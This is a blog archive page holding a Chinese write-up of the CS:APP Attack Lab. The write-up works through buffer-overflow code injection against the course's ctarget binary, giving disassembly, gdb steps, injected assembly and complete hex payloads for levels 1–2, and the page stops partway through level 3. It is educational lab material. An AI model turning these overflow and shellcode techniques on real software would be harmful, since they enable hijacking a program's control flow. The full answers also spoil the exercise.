
<!DOCTYPE html>
<html lang="zh-cn">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="码龙的窝">
    <title>归档: 2017 - 码龙的窝</title>
    <meta name="author" content="码龙黑曜">
    
        <meta name="keywords" content="博客,iOS,Computer Science,码龙,">
    
    
    
    <script type="application/ld+json">{}</script>
    <meta name="description" content="数据界层的码龙 - iOS开发者, 希望在扎实计算机基础的同时更多地接触不同的方向">
<meta name="keywords" content="博客,iOS,Computer Science,码龙">
<meta property="og:type" content="blog">
<meta property="og:title" content="码龙的窝">
<meta property="og:url" content="http://blog.codedragon.tech/archives/2017/page/2/index.html">
<meta property="og:site_name" content="码龙的窝">
<meta property="og:description" content="数据界层的码龙 - iOS开发者, 希望在扎实计算机基础的同时更多地接触不同的方向">
<meta property="og:locale" content="zh-cn">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="码龙的窝">
<meta name="twitter:description" content="数据界层的码龙 - iOS开发者, 希望在扎实计算机基础的同时更多地接触不同的方向">
    
    
        
    
    
        <meta property="og:image" content="http://blog.codedragon.tech/assets/images/avatar.jpg"/>
    
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-j4w0tbtf1olriqsnfyv4egntpbdblucqpyraoqqnvawa2vd6l4m8ljtn2yes.min.css">
    <!--STYLES END-->
    
    <script type="text/javascript">
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

        ga('create', 'UA-108458894-1', 'auto');
        ga('send', 'pageview');
    </script>


    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="1">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a class="header-title-link" href="/ ">码龙的窝</a>
    </div>
    
        
            <a  class="header-right-picture "
                href="#about">
        
        
            <img class="header-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="1">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a href="/#about">
                    <img class="sidebar-profile-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
                </a>
                <h4 class="sidebar-profile-name">码龙黑曜</h4>
                
                    <h5 class="sidebar-profile-bio"><p>iOS开发者/计算机科学/兽人控</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                            title="首页"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">首页</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                            title="分类"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">分类</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                            title="标签"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">标签</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                            title="归档"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">归档</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/projects"
                            
                            title="项目"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-code" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">项目</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/about"
                            
                            title="关于"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">关于</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/BlackDragonF" target="_blank" rel="noopener" title="GitHub">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://t.me/Cosidian" target="_blank" rel="noopener" title="Telegram">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-telegram" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Telegram</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://steamcommunity.com/id/BlackDragonF/" target="_blank" rel="noopener" title="Steam">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-steam" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Steam</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="mailto:obsidiandragon2016@gmail.com" target="_blank" rel="noopener" title="邮箱">
                    
                        <i class="sidebar-button-icon fa fa-lg fa-envelope-o" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">邮箱</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/links"
                            
                            title="友情链接"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-link" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">友情链接</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/resources"
                            
                            title="学习资源"
                        >
                    
                        <i class="sidebar-button-icon fa fa-lg fa-share-alt" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">学习资源</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="1"
                 class="
                        hasCoverMetaIn
                        ">
                
    <section class="postShorten-group main-content-wrap">
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/05/09/深入理解计算机系统AttackLab实验报告/">
                            深入理解计算机系统AttackLab实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-05-09T13:56:05+08:00">
	
		    5月 09, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/AttackLab" target="_blank" rel="noopener">Github</a>上</p>
<blockquote>
<p>花了一天时间于2017年5月4日完成了《深入理解计算机系统》的第三个Lab - Attack Lab。这个实验对应于书本第三章：程序的机器级表示中，缓冲区溢出攻击部分。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Attack Lab是Buffer Lab的64位版本。在这个实验中，目标是通过代码注入攻击（Code Injection Attack）和返回导向编程（Return Oriented Programming）两种攻击方式，分别修改具有缓冲区溢出漏洞的两个x86_64可执行文件的行为。</p>
<p>本实验主要加深了对于栈规则的理解，以及说明了缓冲区溢出漏洞可能造成的危险后果。</p>
<p>本实验使用了官网给出的自学者讲义中的<a href="http://csapp.cs.cmu.edu/3e/target1.tar" target="_blank" rel="noopener">Ubuntu 12.4 targets</a>，并且使用了运行时参数-q来避免该程序连接远程的计分服务器。</p>
<h2 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h2><p>实验讲义中的target1.tar主要包含了以下文件：</p>
<ul>
<li>README.txt 描述了目录内容</li>
<li>ctarget 一个易受代码注入攻击的可执行程序</li>
<li>rtarget 一个易受返回导向编程攻击的可执行程序</li>
<li>cookie.txt 在攻击中用到的唯一标识符，是8位的16进制代码</li>
<li>farm.c 目标程序的”Gadget Farm”的源代码，你将利用这些代码去生成返回导向编程攻击</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>答案不能使用攻击去避免程序的正确性检查代码。具体来说，ret指令返回的目的地只能是以下3种：</p>
<ul>
<li>函数touch1, touch2, touch3的地址</li>
<li>攻击注入代码的地址</li>
<li>gadget farm中gadgets的地址</li>
</ul>
<p>rtarget中只能用函数start_farm和函数end_farm之间的函数来生成gadget。</p>
<h2 id="目标程序"><a href="#目标程序" class="headerlink" title="目标程序"></a>目标程序</h2><p>目标程序ctarget和rtarget都使用getbuf函数从标准输入流中读取字符串，getbuf函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">	Gets(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Gets函数同标准库函数gets相似，其从标准输入流中读入以’\n’或者是EOF结尾的字符串并且将其存储在制定的地址。在这段代码中，目标地址是一个长BUFFER_SIZE的字符数组。<br>但同时Gets()和gets()都不具备检测目的缓冲区是否足够大以存储输入的字符串的功能，因此可能存在缓冲区溢出的风险。在本次实验中，我们要利用该缓冲区溢出漏洞，改变目标程序的行为。</p>
<p>对于自学者来说，运行target的程序的时候需要带上参数-q以避免其连接并不存在的计分服务器。同时需要注意，用来生成攻击字符串的16进制的代码的任意中间位置都不能包含0a，因为其ascii表示是’\n’，在其之后的任意代码都不会被目标程序读入了。</p>
<h2 id="实验过程及分析"><a href="#实验过程及分析" class="headerlink" title="实验过程及分析"></a>实验过程及分析</h2><h3 id="第1部分-代码注入（Code-Injection）攻击"><a href="#第1部分-代码注入（Code-Injection）攻击" class="headerlink" title="第1部分 代码注入（Code Injection）攻击"></a>第1部分 代码注入（Code Injection）攻击</h3><p>本部分总共包含3个阶段，需要生成相应的攻击字符串去攻击ctarget。目标文件ctarget的栈位置是固定的，并且栈上的代码可执行。这为我们的代码注入攻击提供了机会。</p>
<h4 id="等级1"><a href="#等级1" class="headerlink" title="等级1"></a>等级1</h4><p>阶段一不需要注入自己的代码，攻击字符串只需要将程序重定向至已有的过程即可。</p>
<p>在ctarget中，函数getbuf被test函数调用，而test函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>现在我们需要修改程序的行为，让程序从getbuf返回时不返回到test函数中，而跳转至touch1函数。函数touch1如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先，我们对于目标可执行程序ctarget使用objdump -d ctarget &gt; ctarget-disassemble生成ctarget的反汇编代码。然后观察反汇编代码中的getbuf函数，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:       48 83 ec 28             sub    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:       e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:       b8 01 00 00 00          mov    <span class="variable">$0x1</span>,%eax</span><br><span class="line">  4017b9:       48 83 c4 28             add    <span class="variable">$0x28</span>,%rsp</span><br><span class="line">  4017bd:       c3                      retq   </span><br><span class="line">  4017be:       90                      nop</span><br><span class="line">  4017bf:       90                      nop</span><br></pre></td></tr></table></figure></p>
<p>通过观察sub $0x28,%rsp可以知道，getbuf在局部栈上开辟了大小为40个字节的空间，据此我们可以推测BUFFER_SIZE为40。那么，如果我们输入的字符串长度超过了40个字节，就会造成缓冲区溢出。</p>
<p>这里我们需要复习一下函数栈帧的相关知识。被调用者Q的栈帧自栈底（高地址）到栈顶（低地址）包括了被保存的寄存器，局部变量和参数构造区。而调用者Q的栈帧自栈底到栈顶包括了参数以及返回地址。</p>
<p>对于getbuf函数来说，不存在被保存的寄存器，在缓冲区溢出之后，溢出的字符会直接覆盖调用者栈帧中的返回地址。因此，直接使用touch1的起始地址作为溢出的字符串覆盖返回地址即可。</p>
<p>我们观察反汇编代码中touch1函数的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br></pre></td></tr></table></figure><br>据此可以得出攻击代码的16位表示如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>其中，前40个字节的内容无关紧要（只要不是0a即可），因为它们属于未溢出的部分。这段攻击代码中而真正起作用的是缓冲区溢出的部分，即最后的8个字节。同时要注意到x86_86的机器是小端表示的字节序，即低位放在低字节，高位放在高字节，并且栈的增长方向是由低地址增长到高地址。所以最后8个字节的顺序为 c0 17 40 00 00 00 00 00。<br>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level1/level1.txt|./hex2raw|./ctarget -q</span><br><span class="line">数Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级2"><a href="#等级2" class="headerlink" title="等级2"></a>等级2</h4><p>阶段2需要在攻击字符串中注入少量的代码。</p>
<p>在ctarget中，函数touch2如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: you called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>任务是让ctarget执行函数touch2的代码而不是直接返回到test函数。并且，你必须假装你已经传递了cookie的值作为touch2的参数。</p>
<p>考虑到在ctarget中，栈地址固定以及允许在栈上执行代码，所以我们可以通过缓冲区溢出漏洞将返回地址指定到栈上，在栈上执行相应的指令，为函数touch2设置参数，最后再从栈上返回至touch2函数即可。</p>
<p>同阶段一相似，攻击代码的前40个字节无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，为了让函数能返回到栈上执行代码，我们需要知道栈地址。</p>
<p>使用gdb加载ctarget，并为getbuf函数设置断点，执行程序，当程序因为断点而暂停的时候打印rsp的值。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> getbuf</span><br><span class="line">Breakpoint 1 at 0x4017a8: file buf.c, line 12.</span><br><span class="line">(gdb) run -q</span><br><span class="line">Starting program: /home/zhihaochen/CSAPPLabs/AttackLab/target1/ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, getbuf () at buf.c:12</span><br><span class="line">12	buf.c: 没有那个文件或目录.</span><br><span class="line">(gdb) <span class="built_in">print</span> /x <span class="variable">$rsp</span></span><br><span class="line"><span class="variable">$1</span> = 0x5561dca0</span><br></pre></td></tr></table></figure><br>从中可以得出结论，ctarget在执行getbuf时的栈地址（指向返回地址）为0x5561dca0。因此我们应该将返回地址指定为0x5561dca8。</p>
<p>然后我们用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x59b997fa, %edi <span class="comment">;设置cookie为参数</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch2的地址）</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></span><br></pre></td></tr></table></figure><br>其中add $16,%rsp的值可能需要修改，这是因为我们无法确定这段汇编代码反汇编后占多少字节。同时，我们也要保证rsp移动的位数是8的倍数，这是栈的特性（即push和pop时操作数据的大小为一个机器字长）决定的。</p>
<p>写完了攻击代码后，我们依次使用<code>gcc -c exploit.s</code>以及<code>objdump -d exploit.o &gt; exploit.d</code>将攻击代码汇编和反汇编。具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; gcc -c exploit.s                                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; objdump -d exploit.o &gt; exploit.d                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level2&gt; cat exploit.d                                                 </span><br><span class="line"></span><br><span class="line">exploit.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	bf fa 97 b9 59       	mov    <span class="variable">$0x59b997fa</span>,%edi</span><br><span class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">   9:	c3                   	retq   </span><br></pre></td></tr></table></figure><br>总共是10个字节，小于16个字节，因此源攻击代码中的add $16,%rsp可以直接使用，无需继续更改。<br>最后我们在ctarget-disassemble中观察函数touch2的起始地址，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br></pre></td></tr></table></figure></p>
<p>根据以上的信息，我们最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</span><br><span class="line">bf fa 97 b9 59 48 83 c4</span><br><span class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* 返回地址 指向函数touch2 */</span><br></pre></td></tr></table></figure><br>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level2/level2.txt|./hex2raw|./ctarget -q     </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF FA 97 B9 59 48 83 C4 10 C3 00 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3"><a href="#等级3" class="headerlink" title="等级3"></a>等级3</h4><p>阶段3同样包含了代码注入攻击，但是这次需要将一个字符串作为参数传入。<br>在ctarget中，函数hexmatch和touch3的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">	<span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vlevel = <span class="number">3</span>;		<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>任务是让程序执行touch3的代码而不是直接返回到test，你必须假装你已经将一个cookie的字符串表示作为参数传递给了touch3。</p>
<p>该阶段的思路同阶段二相似，不同的是，阶段二要求传递的参数是一个数字，而阶段三要求传递的参数是一个自己构造的字符串的首地址。因此，我们需要将目标字符串也通过缓冲区溢出攻击注入到栈段，并且将其首地址设置为%rdi。</p>
<p>现在我们来构造攻击字符串，首先，同阶段一和阶段二一样，攻击字符串的前40个字符串无关紧要（只要不是0a），第41-48个字节指定了getbuf的返回地址，同阶段二一样，我们将该返回地址设置为0x5561dca8。</p>
<p>接下来我们使用gcc和objdump来生成攻击代码。首先新建一个exploit.s文件，并在其中编写相应的攻击代码，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="number">$0</span>x0, %edi <span class="comment">;设置第一个参数指向一个字符串（保留）</span></span><br><span class="line"><span class="keyword">add</span> <span class="number">$16</span>, %rsp <span class="comment">;将rsp指向下一个返回地址（函数touch3的地址）</span></span><br><span class="line"><span class="keyword">ret</span> <span class="comment">;返回</span></span><br></pre></td></tr></table></figure><br>注意，在构造该攻击字符串的时候，我们还不知道cookie的字符串的表示的首地址。故我们先使用0x0进行占位。生成最后的攻击字符串时只要用相应的栈地址替换0x0即可。</p>
<p>写完攻击代码之后，我们依次使用gcc和objdump进行汇编和反汇编，具体的操作和结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; gcc -c exploit.s                                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; objdump -d exploit.o &gt; exploit.d                             </span><br><span class="line">user@BlackDragon ~/C/A/t/s/c/level3&gt; cat exploit.d                                                </span><br><span class="line"></span><br><span class="line">exploit.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:	bf 00 00 00 00       	mov    <span class="variable">$0x0</span>,%edi</span><br><span class="line">   5:	48 83 c4 10          	add    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">   9:	c3                   	retq   </span><br></pre></td></tr></table></figure></p>
<p>在攻击代码之后，栈上紧跟着的应该是该攻击代码的返回地址，毫无疑问，在这里我们需要将返回地址指向函数touch3的起始地址。</p>
